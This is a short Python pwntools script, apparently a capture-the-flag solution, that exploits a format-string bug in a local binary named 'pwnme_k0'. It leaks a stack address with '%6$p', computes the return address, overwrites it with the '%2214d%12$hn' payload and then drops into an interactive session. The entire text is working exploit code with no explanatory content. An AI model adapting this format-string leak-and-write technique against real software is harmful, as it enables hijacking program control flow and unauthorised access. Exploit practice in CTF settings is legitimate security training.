from pwn import *

p = process('./pwnme_k0')
context.log_level = 'debug'

p.recvuntil('Input your username(max lenth:20):')
p.sendline('hello')
p.recvuntil('Input your password(max lenth:20):')
p.sendline('%6$p')
p.recvuntil('>')
p.sendline('1')
p.recvuntil('hello\n')
data = p.recvuntil('\n')
data = data.split('\n')[0]
data = int(data,16)
print hex(data)

ret_addr = data - 0x38
p.recvuntil('>')
p.sendline('2')
p.recvuntil('please input new username(max lenth:20):')
p.sendline('hello')
p.recvuntil('please input new password(max lenth:20):')
playload = '%2214d%12$hn'
playload += p64(ret_addr)
p.send(playload)
p.recvuntil('>')
p.sendline('1')

p.interactive()
